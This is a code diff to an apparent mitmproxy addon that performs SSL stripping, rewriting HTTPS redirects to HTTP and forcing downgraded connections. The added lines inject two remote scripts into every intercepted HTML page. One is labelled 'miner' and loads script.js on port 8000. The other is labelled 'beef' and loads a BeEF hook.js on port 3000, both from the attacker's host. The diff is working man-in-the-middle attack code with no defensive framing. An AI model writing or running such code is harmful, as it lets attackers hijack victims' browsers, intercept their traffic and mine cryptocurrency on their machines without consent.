@@ -28,9 +28,12 @@ class Injector:
         # strip links in 'Location' header
         if flow.response.headers.get('Location', '').startswith('https://'):
             location = flow.response.headers['Location']
+            print("\n"+location+"\n")
             hostname = urllib.parse.urlparse(location).hostname
+            print("HOSTNAME: "+hostname)
             if hostname:
                 secure_hosts.add(hostname)
+
             flow.response.headers['Location'] = location.replace('https://', 'http://', 1)
 
         # strip upgrade-insecure-requests in Content-Security-Policy header
@@ -42,15 +45,22 @@ class Injector:
             html = BeautifulSoup(flow.response.content, "html.parser")
             #print(self.path)
             #print(flow.response.headers)
-            if 'Content-Type' in flow.response.headers and 'text/html' in flow.response.headers['Content-Type']:
+            if not 'Content-Type' in flow.response.headers:
+                print("\nNo content type in headers. Get over it.")
+            elif 'text/html' in flow.response.headers['Content-Type']:
                 #print(flow.response.headers["content-type"])
-                script = html.new_tag(
+                miner = html.new_tag(
                     "script",
-                    src=self.path,
+                    src="http://"+self.path+":8000/script.js",
                     type='application/javascript')
-                html.body.insert(0, script)
+                beef = html.new_tag(
+                    "script",
+                    src="http://"+self.path+":3000/hook.js",
+                    type='application/javascript')
+                html.insert(0, miner)
+                html.insert(0, beef)
                 flow.response.content = str(html).encode("utf8")
-                print("\nScript injected.\n\n")
+                print("\nScripts injected.\n\n")
             else:
                 print("\nWrong content type. Sorry.")
                 print(str(flow.response.headers['Content-Type']) + "\n\n")
@@ -73,11 +83,11 @@ class Injector:
         if flow.request.pretty_host in secure_hosts:
             flow.request.scheme = 'https'
             flow.request.port = 443
+        else:
+            flow.request.scheme = 'http'
+            flow.request.port = 80
 
-            # We need to update the request destination to whatever is specified in the host header:
-            # Having no TLS Server Name Indication from the client and just an IP address as request.host
-            # in transparent mode, TLS server name certificate validation would fail.
-            flow.request.host = flow.request.pretty_host
+        flow.request.host = flow.request.pretty_host
 
 def start():
     parser = argparse.ArgumentParser()
